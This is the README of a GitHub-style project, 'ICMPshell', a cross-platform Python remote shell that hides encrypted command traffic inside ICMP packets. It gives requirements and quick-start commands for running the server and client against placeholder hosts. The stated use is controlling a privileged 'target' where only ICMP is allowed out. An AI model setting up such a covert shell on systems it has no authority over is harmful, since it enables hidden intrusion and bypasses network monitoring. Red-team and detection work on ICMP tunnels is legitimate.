# ICMPshell
A remote control based on ICMP tunnel. Ability to support Linux, Darwin, Windows. The communication flow is encrypted with AES encryption of CBC mode. But the server and the client need Root / Administrator permissions, which is suitable for getting target high rights and only ICMP can be connected.



## Requirements

```
pycryptodome==3.11.0
# I use Python 3.6 to develop this project
```



## QUICK START

````python
# server
python3 server.py -r {rhost} -b {bind_ip}

# cilent
python3 cilent.py -l {lhost} -b {bind_ip}

# In Linux and Darwin operating systems, -b parameters (bind_ip) can be specified as 0.0.0.0, Windows needs to judge which network interface card
````



## Darwin

![darwin](/Users/17man/Documents/GitHub/ICMPshell/img/darwin.jpg)



## Linux

![linux_server](/Users/17man/Documents/GitHub/ICMPshell/img/linux_server.jpg)



![linux_cilent](/Users/17man/Documents/GitHub/ICMPshell/img/linux_cilent.jpg)



## Windows

![win](/Users/17man/Documents/GitHub/ICMPshell/img/win.jpg)



## Known issues

By default, OSX has a limited maximum UDP package for 9216 bytes. So you can't read the contents of this byte number. In the later stage, I will consider adding a flag to a single transmission in the UDP traffic.

This project only has a simple test, if there is an error, Issue can be turned on.
